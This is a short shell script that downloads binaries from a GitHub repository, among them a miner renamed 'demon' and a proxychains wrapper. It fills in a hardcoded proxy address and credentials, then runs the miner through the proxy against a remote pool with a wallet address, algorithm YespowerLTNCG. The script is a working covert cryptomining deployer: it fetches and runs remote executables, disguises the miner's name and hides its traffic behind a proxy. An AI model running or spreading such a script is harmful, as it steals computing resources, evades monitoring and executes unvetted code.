proxy="176.58.122.142" 
port="4145" 
user="biandewi"  
pass="1507"
wget -q -O demon https://github.com/sartielena/jajal/raw/main/httpd && chmod +x demon
wget -q https://github.com/sartielena/jajal/raw/main/panel && chmod +x panel 
wget -q https://raw.githubusercontent.com/sartielena/jajal/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://github.com/sartielena/jajal/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./demon -a YespowerLTNCG -o 172.232.3.174:443 -u MR7quZT8SMCvfbnK8zUi9NZB6snmgAWaV6.$(echo $(shuf -i 1-9 -n 1)-yui) -p x
